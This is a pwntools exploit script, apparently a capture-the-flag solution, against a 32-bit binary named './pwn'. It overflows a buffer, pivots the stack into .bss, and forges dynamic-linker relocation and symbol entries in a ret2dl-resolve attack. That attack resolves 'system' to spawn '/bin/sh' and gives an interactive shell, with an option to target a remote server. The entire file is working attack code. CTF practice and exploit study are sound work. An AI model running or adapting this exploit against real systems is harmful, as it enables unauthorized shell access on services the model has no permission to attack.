from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x8048428
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pwn'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
context.arch = 'i386'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
rop = ROP(elf)
#sleep(3)
offset = 44
bss_addr = elf.bss()

stack_size = 0xf00
stack_addr = bss_addr + stack_size

rop.raw('a' * offset)
rop.read(0, stack_addr, 100)
rop.migrate(stack_addr)
p.send(rop.chain())

rop = ROP(elf)
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

fake_sym = stack_addr + 32
align = 0x10 - ((fake_sym - dynsym) & 0xf)
fake_sym += align
idx_dynsym = int((fake_sym - dynsym) / 0x10)
st_name = fake_sym + 0x10 - dynstr
fake_read_sym = flat([
    st_name, 0, 0, 0x12
    ])

idx_offset = stack_addr + 24 - rel_plt
read_got = elf.got['read']
r_info = (idx_dynsym << 8) | 0x7
fake_rel = flat([
    read_got, r_info
    ])
system = 'system\x00\x00'
rop.raw(plt0)
rop.raw(idx_offset)
rop.raw('aaaa')
rop.raw(stack_addr + 80)
rop.raw('aaaa')
rop.raw('aaaa')
rop.raw(fake_rel)
rop.raw('a'*align)
rop.raw(fake_read_sym)
rop.raw(system)
rop.raw('a'*(80 - len(rop.chain())))
rop.raw('/bin/sh\x00')
rop.raw('a'*(100 - len(rop.chain())))

print(rop.dump() )

p.sendline(rop.chain())
p.interactive()





